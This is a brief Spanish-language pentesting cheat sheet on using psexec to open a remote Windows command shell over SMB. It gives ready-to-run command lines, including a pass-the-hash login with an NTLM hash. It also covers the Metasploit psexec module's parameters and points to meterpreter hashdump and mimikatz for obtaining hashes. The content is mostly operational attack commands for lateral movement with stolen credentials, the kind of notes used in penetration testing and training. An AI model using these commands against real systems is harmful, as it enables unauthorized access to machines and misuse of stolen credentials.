aplicacion para ingresar al sistema vía smb en windows, necesitas tener usuarios validos, abriendo una linea de comandos.
existe tambien un modulo en msfconsole que hace lo mismo, pero usa temas maliciosos, que podrian ser bloqueados por antivirus

example: psexec Administrator@192.168.100.1 cmd.exe 

```
psexec administrator@192.168.100.1 cmd.exe
```

Ingreso usando hash NT:NTLM como contraseña
```
psexec administrator@192.168.100.1 -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

-----
Pass the hash usando modulo metasploit

Modulo de msfconsole
```
exploit/windows/smb/psexec
  - parametro SMBPass permite ingresar contraseña en texto claro y tambien el hash NT:NTLM (NT:NTLM puede obtenerse con funcion hashdump de meterpreter - NTLM tambien puede obtenerse con mimikatz)
  - puede necesitar modificar el target (set target command o set target native\ upload)
```
